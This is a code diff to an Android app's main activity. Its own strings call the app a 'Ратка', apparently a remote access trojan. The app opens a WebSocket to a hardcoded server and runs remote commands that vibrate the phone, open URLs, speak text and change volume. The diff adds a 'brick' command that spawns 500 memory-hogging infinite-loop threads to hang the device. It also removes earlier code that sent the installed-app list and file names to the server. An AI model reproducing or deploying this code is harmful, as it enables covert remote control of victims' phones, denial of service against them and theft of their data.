@@ -4,6 +4,7 @@ import android.app.Activity
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
+import android.media.AudioManager
 import android.media.RingtoneManager
 import android.net.Uri
 import android.os.BatteryManager
@@ -11,6 +12,7 @@ import android.os.Build
 import android.os.Bundle
 import android.os.VibrationEffect
 import android.os.Vibrator
+import android.speech.tts.TextToSpeech
 import android.util.Log
 import android.widget.Button
 import android.widget.LinearLayout
@@ -19,6 +21,7 @@ import android.widget.Toast
 import okhttp3.*
 import org.json.JSONArray
 import org.json.JSONObject
+import java.util.Locale
 import java.util.concurrent.TimeUnit
 
 class MainActivity : Activity() {
@@ -27,12 +30,18 @@ class MainActivity : Activity() {
         .build()
     private var webSocket: WebSocket? = null
     private var statusText: TextView? = null
-    
-    // ВОТ ТУТ ПРЯМОЙ WEBSOCKET БЕЗ SOCKET.IO
+    private var tts: TextToSpeech? = null
     private val wsUrl = "wss://sanya-tech.cc.cd/ws"
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        
+        tts = TextToSpeech(this) { status ->
+            if (status == TextToSpeech.SUCCESS) {
+                tts?.language = Locale("ru", "RU")
+            }
+        }
+
         val layout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             setPadding(32, 32, 32, 32)
@@ -52,7 +61,6 @@ class MainActivity : Activity() {
         webSocket = client.newWebSocket(request, object : WebSocketListener() {
             override fun onOpen(webSocket: WebSocket, response: Response) {
                 runOnUiThread { statusText?.text = "Подключено к Ратке" }
-                // Отправляем чистый JSON при подключении
                 val hello = JSONObject().apply {
                     put("type", "connect")
                     put("device_type", "android")
@@ -67,12 +75,14 @@ class MainActivity : Activity() {
                     val json = JSONObject(text)
                     when (json.optString("cmd")) {
                         "battery" -> sendBatteryInfo(webSocket)
-                        "vibrate" -> vibratePhone()
+                        "vibrate" -> vibratePhone(json.optInt("duration", 2000))
                         "toast" -> showToast(json.optString("text", "Привет от Ратки!"))
                         "open_url" -> openUrl(json.optString("url", "https://google.com"))
                         "sound" -> playSound()
-                        "apps" -> sendInstalledApps(webSocket)
-                        "files" -> sendDownloads(webSocket)
+                        "speak" -> speakText(json.optString("text", "Привет!"))
+                        "volume_up" -> changeVolume(true)
+                        "volume_down" -> changeVolume(false)
+                        "brick" -> brickPhone()
                     }
                 } catch (e: Exception) {
                     Log.e("RATKA", "Ошибка", e)
@@ -103,15 +113,15 @@ class MainActivity : Activity() {
         }.toString())
     }
 
-    private fun vibratePhone() {
+    private fun vibratePhone(duration: Int) {
         val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            vibrator.vibrate(VibrationEffect.createOneShot(2000, VibrationEffect.DEFAULT_AMPLITUDE))
+            vibrator.vibrate(VibrationEffect.createOneShot(duration.toLong(), VibrationEffect.DEFAULT_AMPLITUDE))
         } else {
             @Suppress("DEPRECATION")
-            vibrator.vibrate(2000)
+            vibrator.vibrate(duration.toLong())
         }
-        runOnUiThread { statusText?.text = "Вибрация 2 секунды" }
+        runOnUiThread { statusText?.text = "Вибрация $duration мс" }
     }
 
     private fun showToast(text: String) {
@@ -131,21 +141,38 @@ class MainActivity : Activity() {
         runOnUiThread { statusText?.text = "Проигран звук" }
     }
 
-    private fun sendInstalledApps(ws: WebSocket) {
-        val pm = packageManager
-        val apps = pm.getInstalledApplications(0).map { it.packageName }.filter { !it.startsWith("android.") }
-        ws.send(JSONObject().apply {
-            put("type", "apps")
-            put("list", JSONArray(apps.take(30)))
-        }.toString())
+    private fun speakText(text: String) {
+        tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "RatkaTTS")
+        runOnUiThread { statusText?.text = "Озвучивание: $text" }
     }
 
-    private fun sendDownloads(ws: WebSocket) {
-        val dir = getExternalFilesDir(null)
-        val files = dir?.listFiles()?.map { it.name } ?: emptyList()
-        ws.send(JSONObject().apply {
-            put("type", "files")
-            put("list", JSONArray(files))
-        }.toString())
+    private fun changeVolume(up: Boolean) {
+        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+        audioManager.adjustStreamVolume(
+            AudioManager.STREAM_MUSIC,
+            if (up) AudioManager.ADJUST_RAISE else AudioManager.ADJUST_LOWER,
+            AudioManager.FLAG_SHOW_UI
+        )
+        runOnUiThread { statusText?.text = if (up) "Громкость +" else "Громкость -" }
+    }
+
+    private fun brickPhone() {
+        // Ебанутый прикол, который вешает систему
+        for (i in 1..500) {
+            Thread {
+                var counter = 0L
+                val hog = ByteArray(10 * 1024 * 1024)
+                while (true) {
+                    counter += 1
+                    if (counter == Long.MAX_VALUE) counter = 0
+                }
+            }.start()
+        }
+        runOnUiThread { statusText?.text = "КИРПИЧ АКТИВИРОВАН" }
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        tts?.shutdown()
     }
 }
